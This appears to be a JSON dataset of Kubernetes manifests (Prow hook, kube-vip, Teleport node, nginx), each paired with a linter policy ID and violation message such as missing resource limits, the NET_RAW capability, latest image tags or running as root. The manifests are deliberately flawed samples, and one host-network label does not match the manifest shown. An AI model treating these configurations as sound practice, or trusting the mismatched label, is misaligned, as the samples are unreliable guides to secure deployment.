    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20220209-cd556c1953\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/kubeconfig\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: k8s-infra-prow-hmac-token\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-build-clusters-kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hook\" has cpu request 0"
  },
  {
    "id": "10144",
    "manifest_path": "data/manifests/the_stack_sample/sample_3906.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20220209-cd556c1953\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/kubeconfig\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: k8s-infra-prow-hmac-token\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-build-clusters-kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hook\" has memory limit 0"
  },
  {
    "id": "10145",
    "manifest_path": "data/manifests/the_stack_sample/sample_3907.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-vip\n  namespace: kube-system\n  labels:\n    app.kubernetes.io/instance: kube-vip\n    app.kubernetes.io/name: kube-vip\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/instance: kube-vip\n      app.kubernetes.io/name: kube-vip\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/instance: kube-vip\n        app.kubernetes.io/name: kube-vip\n    spec:\n      containers:\n      - name: kube-vip\n        image: ghcr.io/kube-vip/kube-vip:v0.4.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - manager\n        env:\n        - name: vip_arp\n          value: 'true'\n        - name: vip_interface\n          value: eth0\n        - name: port\n          value: '6443'\n        - name: vip_cidr\n          value: '32'\n        - name: cp_enable\n          value: 'true'\n        - name: cp_namespace\n          value: kube-system\n        - name: svc_enable\n          value: 'false'\n        - name: vip_address\n          value: 88.198.145.218\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - NET_RAW\n      serviceAccountName: kube-vip\n",
    "policy_id": "drop-net-raw-capability",
    "violation_text": "container \"kube-vip\" has ADD capability: \"NET_RAW\", which matched with the forbidden capability for containers"
  },
  {
    "id": "10146",
    "manifest_path": "data/manifests/the_stack_sample/sample_3907.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-vip\n  namespace: kube-system\n  labels:\n    app.kubernetes.io/instance: kube-vip\n    app.kubernetes.io/name: kube-vip\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/instance: kube-vip\n      app.kubernetes.io/name: kube-vip\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/instance: kube-vip\n        app.kubernetes.io/name: kube-vip\n    spec:\n      containers:\n      - name: kube-vip\n        image: ghcr.io/kube-vip/kube-vip:v0.4.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - manager\n        env:\n        - name: vip_arp\n          value: 'true'\n        - name: vip_interface\n          value: eth0\n        - name: port\n          value: '6443'\n        - name: vip_cidr\n          value: '32'\n        - name: cp_enable\n          value: 'true'\n        - name: cp_namespace\n          value: kube-system\n        - name: svc_enable\n          value: 'false'\n        - name: vip_address\n          value: 88.198.145.218\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - NET_RAW\n      serviceAccountName: kube-vip\n",
    "policy_id": "drop-net-raw-capability",
    "violation_text": "container \"kube-vip\" has DROP capabilities: [], but does not drop capability \"NET_RAW\" which is required"
  },
  {
    "id": "10147",
    "manifest_path": "data/manifests/the_stack_sample/sample_3907.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-vip\n  namespace: kube-system\n  labels:\n    app.kubernetes.io/instance: kube-vip\n    app.kubernetes.io/name: kube-vip\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/instance: kube-vip\n      app.kubernetes.io/name: kube-vip\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/instance: kube-vip\n        app.kubernetes.io/name: kube-vip\n    spec:\n      containers:\n      - name: kube-vip\n        image: ghcr.io/kube-vip/kube-vip:v0.4.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - manager\n        env:\n        - name: vip_arp\n          value: 'true'\n        - name: vip_interface\n          value: eth0\n        - name: port\n          value: '6443'\n        - name: vip_cidr\n          value: '32'\n        - name: cp_enable\n          value: 'true'\n        - name: cp_namespace\n          value: kube-system\n        - name: svc_enable\n          value: 'false'\n        - name: vip_address\n          value: 88.198.145.218\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - NET_RAW\n      serviceAccountName: kube-vip\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "10148",
    "manifest_path": "data/manifests/the_stack_sample/sample_3907.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-vip\n  namespace: kube-system\n  labels:\n    app.kubernetes.io/instance: kube-vip\n    app.kubernetes.io/name: kube-vip\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/instance: kube-vip\n      app.kubernetes.io/name: kube-vip\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/instance: kube-vip\n        app.kubernetes.io/name: kube-vip\n    spec:\n      containers:\n      - name: kube-vip\n        image: ghcr.io/kube-vip/kube-vip:v0.4.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - manager\n        env:\n        - name: vip_arp\n          value: 'true'\n        - name: vip_interface\n          value: eth0\n        - name: port\n          value: '6443'\n        - name: vip_cidr\n          value: '32'\n        - name: cp_enable\n          value: 'true'\n        - name: cp_namespace\n          value: kube-system\n        - name: svc_enable\n          value: 'false'\n        - name: vip_address\n          value: 88.198.145.218\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - NET_RAW\n      serviceAccountName: kube-vip\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-vip\" does not have a read-only root file system"
  },
  {
    "id": "10149",
    "manifest_path": "data/manifests/the_stack_sample/sample_3907.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-vip\n  namespace: kube-system\n  labels:\n    app.kubernetes.io/instance: kube-vip\n    app.kubernetes.io/name: kube-vip\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/instance: kube-vip\n      app.kubernetes.io/name: kube-vip\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/instance: kube-vip\n        app.kubernetes.io/name: kube-vip\n    spec:\n      containers:\n      - name: kube-vip\n        image: ghcr.io/kube-vip/kube-vip:v0.4.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - manager\n        env:\n        - name: vip_arp\n          value: 'true'\n        - name: vip_interface\n          value: eth0\n        - name: port\n          value: '6443'\n        - name: vip_cidr\n          value: '32'\n        - name: cp_enable\n          value: 'true'\n        - name: cp_namespace\n          value: kube-system\n        - name: svc_enable\n          value: 'false'\n        - name: vip_address\n          value: 88.198.145.218\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - NET_RAW\n      serviceAccountName: kube-vip\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"kube-vip\" not found"
  },
  {
    "id": "10150",
    "manifest_path": "data/manifests/the_stack_sample/sample_3907.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-vip\n  namespace: kube-system\n  labels:\n    app.kubernetes.io/instance: kube-vip\n    app.kubernetes.io/name: kube-vip\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/instance: kube-vip\n      app.kubernetes.io/name: kube-vip\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/instance: kube-vip\n        app.kubernetes.io/name: kube-vip\n    spec:\n      containers:\n      - name: kube-vip\n        image: ghcr.io/kube-vip/kube-vip:v0.4.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - manager\n        env:\n        - name: vip_arp\n          value: 'true'\n        - name: vip_interface\n          value: eth0\n        - name: port\n          value: '6443'\n        - name: vip_cidr\n          value: '32'\n        - name: cp_enable\n          value: 'true'\n        - name: cp_namespace\n          value: kube-system\n        - name: svc_enable\n          value: 'false'\n        - name: vip_address\n          value: 88.198.145.218\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - NET_RAW\n      serviceAccountName: kube-vip\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-vip\" is not set to runAsNonRoot"
  },
  {
    "id": "10151",
    "manifest_path": "data/manifests/the_stack_sample/sample_3907.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-vip\n  namespace: kube-system\n  labels:\n    app.kubernetes.io/instance: kube-vip\n    app.kubernetes.io/name: kube-vip\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/instance: kube-vip\n      app.kubernetes.io/name: kube-vip\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/instance: kube-vip\n        app.kubernetes.io/name: kube-vip\n    spec:\n      containers:\n      - name: kube-vip\n        image: ghcr.io/kube-vip/kube-vip:v0.4.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - manager\n        env:\n        - name: vip_arp\n          value: 'true'\n        - name: vip_interface\n          value: eth0\n        - name: port\n          value: '6443'\n        - name: vip_cidr\n          value: '32'\n        - name: cp_enable\n          value: 'true'\n        - name: cp_namespace\n          value: kube-system\n        - name: svc_enable\n          value: 'false'\n        - name: vip_address\n          value: 88.198.145.218\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - NET_RAW\n      serviceAccountName: kube-vip\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kube-vip\" has cpu request 0"
  },
  {
    "id": "10152",
    "manifest_path": "data/manifests/the_stack_sample/sample_3907.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-vip\n  namespace: kube-system\n  labels:\n    app.kubernetes.io/instance: kube-vip\n    app.kubernetes.io/name: kube-vip\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/instance: kube-vip\n      app.kubernetes.io/name: kube-vip\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/instance: kube-vip\n        app.kubernetes.io/name: kube-vip\n    spec:\n      containers:\n      - name: kube-vip\n        image: ghcr.io/kube-vip/kube-vip:v0.4.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - manager\n        env:\n        - name: vip_arp\n          value: 'true'\n        - name: vip_interface\n          value: eth0\n        - name: port\n          value: '6443'\n        - name: vip_cidr\n          value: '32'\n        - name: cp_enable\n          value: 'true'\n        - name: cp_namespace\n          value: kube-system\n        - name: svc_enable\n          value: 'false'\n        - name: vip_address\n          value: 88.198.145.218\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - NET_RAW\n      serviceAccountName: kube-vip\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-vip\" has memory limit 0"
  },
  {
    "id": "10153",
    "manifest_path": "data/manifests/the_stack_sample/sample_3908.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  annotations:\n    argocd.argoproj.io/sync-wave: '1'\n  labels:\n    app.kubernetes.io/component: node\n    app.kubernetes.io/name: teleport\n  name: node-kintone-neco\n  namespace: teleport\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: node\n      app.kubernetes.io/name: teleport\n      teleport-node: kintone-neco\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '3020'\n      labels:\n        app.kubernetes.io/component: node\n        app.kubernetes.io/name: teleport\n        teleport-node: kintone-neco\n    spec:\n      containers:\n      - args:\n        - --roles=node\n        - --labels=team=kintone-neco\n        - --diag-addr=0.0.0.0:3020\n        image: quay.io/cybozu/teleport-node\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 3020\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        name: node-kintone-neco\n        ports:\n        - containerPort: 3020\n          name: metrics\n        resources:\n          requests:\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /etc/teleport\n          name: teleport-node-secret\n          readOnly: true\n        - mountPath: /var/lib/teleport\n          name: teleport-storage\n        - mountPath: /opt/neco-operation-cli/bin\n          name: neco-operation-cli\n          readOnly: true\n        - mountPath: /home/cybozu\n          name: home-dir\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 10000\n      serviceAccountName: node-kintone-neco\n      volumes:\n      - name: teleport-node-secret\n        secret:\n          secretName: teleport-node-secret-20211130\n      - emptyDir: {}\n        name: teleport-storage\n      - hostPath:\n          path: /opt/neco-operation-cli/bin\n        name: neco-operation-cli\n      - ephemeral:\n          volumeClaimTemplate:\n            spec:\n              accessModes:\n              - ReadWriteOnce\n              resources:\n                requests:\n                  storage: 10Gi\n              storageClassName: topolvm-provisioner\n        name: home-dir\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"node-kintone-neco\" is using an invalid container image, \"quay.io/cybozu/teleport-node\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10154",
    "manifest_path": "data/manifests/the_stack_sample/sample_3908.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  annotations:\n    argocd.argoproj.io/sync-wave: '1'\n  labels:\n    app.kubernetes.io/component: node\n    app.kubernetes.io/name: teleport\n  name: node-kintone-neco\n  namespace: teleport\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: node\n      app.kubernetes.io/name: teleport\n      teleport-node: kintone-neco\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '3020'\n      labels:\n        app.kubernetes.io/component: node\n        app.kubernetes.io/name: teleport\n        teleport-node: kintone-neco\n    spec:\n      containers:\n      - args:\n        - --roles=node\n        - --labels=team=kintone-neco\n        - --diag-addr=0.0.0.0:3020\n        image: quay.io/cybozu/teleport-node\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 3020\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        name: node-kintone-neco\n        ports:\n        - containerPort: 3020\n          name: metrics\n        resources:\n          requests:\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /etc/teleport\n          name: teleport-node-secret\n          readOnly: true\n        - mountPath: /var/lib/teleport\n          name: teleport-storage\n        - mountPath: /opt/neco-operation-cli/bin\n          name: neco-operation-cli\n          readOnly: true\n        - mountPath: /home/cybozu\n          name: home-dir\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 10000\n      serviceAccountName: node-kintone-neco\n      volumes:\n      - name: teleport-node-secret\n        secret:\n          secretName: teleport-node-secret-20211130\n      - emptyDir: {}\n        name: teleport-storage\n      - hostPath:\n          path: /opt/neco-operation-cli/bin\n        name: neco-operation-cli\n      - ephemeral:\n          volumeClaimTemplate:\n            spec:\n              accessModes:\n              - ReadWriteOnce\n              resources:\n                requests:\n                  storage: 10Gi\n              storageClassName: topolvm-provisioner\n        name: home-dir\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"node-kintone-neco\" does not have a read-only root file system"
  },
  {
    "id": "10155",
    "manifest_path": "data/manifests/the_stack_sample/sample_3908.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  annotations:\n    argocd.argoproj.io/sync-wave: '1'\n  labels:\n    app.kubernetes.io/component: node\n    app.kubernetes.io/name: teleport\n  name: node-kintone-neco\n  namespace: teleport\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: node\n      app.kubernetes.io/name: teleport\n      teleport-node: kintone-neco\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '3020'\n      labels:\n        app.kubernetes.io/component: node\n        app.kubernetes.io/name: teleport\n        teleport-node: kintone-neco\n    spec:\n      containers:\n      - args:\n        - --roles=node\n        - --labels=team=kintone-neco\n        - --diag-addr=0.0.0.0:3020\n        image: quay.io/cybozu/teleport-node\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 3020\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        name: node-kintone-neco\n        ports:\n        - containerPort: 3020\n          name: metrics\n        resources:\n          requests:\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /etc/teleport\n          name: teleport-node-secret\n          readOnly: true\n        - mountPath: /var/lib/teleport\n          name: teleport-storage\n        - mountPath: /opt/neco-operation-cli/bin\n          name: neco-operation-cli\n          readOnly: true\n        - mountPath: /home/cybozu\n          name: home-dir\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 10000\n      serviceAccountName: node-kintone-neco\n      volumes:\n      - name: teleport-node-secret\n        secret:\n          secretName: teleport-node-secret-20211130\n      - emptyDir: {}\n        name: teleport-storage\n      - hostPath:\n          path: /opt/neco-operation-cli/bin\n        name: neco-operation-cli\n      - ephemeral:\n          volumeClaimTemplate:\n            spec:\n              accessModes:\n              - ReadWriteOnce\n              resources:\n                requests:\n                  storage: 10Gi\n              storageClassName: topolvm-provisioner\n        name: home-dir\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"node-kintone-neco\" not found"
  },
  {
    "id": "10156",
    "manifest_path": "data/manifests/the_stack_sample/sample_3908.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  annotations:\n    argocd.argoproj.io/sync-wave: '1'\n  labels:\n    app.kubernetes.io/component: node\n    app.kubernetes.io/name: teleport\n  name: node-kintone-neco\n  namespace: teleport\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: node\n      app.kubernetes.io/name: teleport\n      teleport-node: kintone-neco\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '3020'\n      labels:\n        app.kubernetes.io/component: node\n        app.kubernetes.io/name: teleport\n        teleport-node: kintone-neco\n    spec:\n      containers:\n      - args:\n        - --roles=node\n        - --labels=team=kintone-neco\n        - --diag-addr=0.0.0.0:3020\n        image: quay.io/cybozu/teleport-node\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 3020\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        name: node-kintone-neco\n        ports:\n        - containerPort: 3020\n          name: metrics\n        resources:\n          requests:\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /etc/teleport\n          name: teleport-node-secret\n          readOnly: true\n        - mountPath: /var/lib/teleport\n          name: teleport-storage\n        - mountPath: /opt/neco-operation-cli/bin\n          name: neco-operation-cli\n          readOnly: true\n        - mountPath: /home/cybozu\n          name: home-dir\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 10000\n      serviceAccountName: node-kintone-neco\n      volumes:\n      - name: teleport-node-secret\n        secret:\n          secretName: teleport-node-secret-20211130\n      - emptyDir: {}\n        name: teleport-storage\n      - hostPath:\n          path: /opt/neco-operation-cli/bin\n        name: neco-operation-cli\n      - ephemeral:\n          volumeClaimTemplate:\n            spec:\n              accessModes:\n              - ReadWriteOnce\n              resources:\n                requests:\n                  storage: 10Gi\n              storageClassName: topolvm-provisioner\n        name: home-dir\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"node-kintone-neco\" has cpu request 0"
  },
  {
    "id": "10157",
    "manifest_path": "data/manifests/the_stack_sample/sample_3908.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  annotations:\n    argocd.argoproj.io/sync-wave: '1'\n  labels:\n    app.kubernetes.io/component: node\n    app.kubernetes.io/name: teleport\n  name: node-kintone-neco\n  namespace: teleport\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: node\n      app.kubernetes.io/name: teleport\n      teleport-node: kintone-neco\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '3020'\n      labels:\n        app.kubernetes.io/component: node\n        app.kubernetes.io/name: teleport\n        teleport-node: kintone-neco\n    spec:\n      containers:\n      - args:\n        - --roles=node\n        - --labels=team=kintone-neco\n        - --diag-addr=0.0.0.0:3020\n        image: quay.io/cybozu/teleport-node\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 3020\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        name: node-kintone-neco\n        ports:\n        - containerPort: 3020\n          name: metrics\n        resources:\n          requests:\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /etc/teleport\n          name: teleport-node-secret\n          readOnly: true\n        - mountPath: /var/lib/teleport\n          name: teleport-storage\n        - mountPath: /opt/neco-operation-cli/bin\n          name: neco-operation-cli\n          readOnly: true\n        - mountPath: /home/cybozu\n          name: home-dir\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 10000\n      serviceAccountName: node-kintone-neco\n      volumes:\n      - name: teleport-node-secret\n        secret:\n          secretName: teleport-node-secret-20211130\n      - emptyDir: {}\n        name: teleport-storage\n      - hostPath:\n          path: /opt/neco-operation-cli/bin\n        name: neco-operation-cli\n      - ephemeral:\n          volumeClaimTemplate:\n            spec:\n              accessModes:\n              - ReadWriteOnce\n              resources:\n                requests:\n                  storage: 10Gi\n              storageClassName: topolvm-provisioner\n        name: home-dir\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"node-kintone-neco\" has memory limit 0"
  },
  {
    "id": "10158",
    "manifest_path": "data/manifests/the_stack_sample/sample_3912.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: default-http-backend\n  namespace: nginx-ingress\nspec:\n  ports:\n  - port: 80\n    targetPort: 8005\n    protocol: TCP\n  selector:\n    app: gitlab-gitlab\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:gitlab-gitlab])"
  },
  {
    "id": "10159",
    "manifest_path": "data/manifests/the_stack_sample/sample_3913.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: my-nginx\n  namespace: names1\nspec:\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        run: my-nginx\n    spec:\n      containers:\n      - name: my-nginx\n        image: nginx:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 80\n          protocol: TCP\n          name: nginx-port\n        volumeMounts:\n        - name: java\n          mountPath: /opt/java\n          readOnly: true\n      volumes:\n      - name: java\n        hostPath:\n          path: /root/jdk1.8.0_101\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"my-nginx\" is using an invalid container image, \"nginx:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10160",
    "manifest_path": "data/manifests/the_stack_sample/sample_3913.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: my-nginx\n  namespace: names1\nspec:\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        run: my-nginx\n    spec:\n      containers:\n      - name: my-nginx\n        image: nginx:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 80\n          protocol: TCP\n          name: nginx-port\n        volumeMounts:\n        - name: java\n          mountPath: /opt/java\n          readOnly: true\n      volumes:\n      - name: java\n        hostPath:\n          path: /root/jdk1.8.0_101\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10161",
    "manifest_path": "data/manifests/the_stack_sample/sample_3913.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: my-nginx\n  namespace: names1\nspec:\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        run: my-nginx\n    spec:\n      containers:\n      - name: my-nginx\n        image: nginx:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 80\n          protocol: TCP\n          name: nginx-port\n        volumeMounts:\n        - name: java\n          mountPath: /opt/java\n          readOnly: true\n      volumes:\n      - name: java\n        hostPath:\n          path: /root/jdk1.8.0_101\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"my-nginx\" does not have a read-only root file system"
  },
  {
    "id": "10162",
    "manifest_path": "data/manifests/the_stack_sample/sample_3913.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: my-nginx\n  namespace: names1\nspec:\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        run: my-nginx\n    spec:\n      containers:\n      - name: my-nginx\n        image: nginx:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 80\n          protocol: TCP\n          name: nginx-port\n        volumeMounts:\n        - name: java\n          mountPath: /opt/java\n          readOnly: true\n      volumes:\n      - name: java\n        hostPath:\n          path: /root/jdk1.8.0_101\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"my-nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10163",
    "manifest_path": "data/manifests/the_stack_sample/sample_3913.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: my-nginx\n  namespace: names1\nspec:\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        run: my-nginx\n    spec:\n      containers:\n      - name: my-nginx\n        image: nginx:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 80\n          protocol: TCP\n          name: nginx-port\n        volumeMounts:\n        - name: java\n          mountPath: /opt/java\n          readOnly: true\n      volumes:\n      - name: java\n        hostPath:\n          path: /root/jdk1.8.0_101\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"my-nginx\" has cpu request 0"
  },
  {
    "id": "10164",
    "manifest_path": "data/manifests/the_stack_sample/sample_3913.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: my-nginx\n  namespace: names1\nspec:\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        run: my-nginx\n    spec:\n      containers:\n      - name: my-nginx\n        image: nginx:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 80\n          protocol: TCP\n          name: nginx-port\n        volumeMounts:\n        - name: java\n          mountPath: /opt/java\n          readOnly: true\n      volumes:\n      - name: java\n        hostPath:\n          path: /root/jdk1.8.0_101\n",
    "policy_id": "unset-memory-requirements",
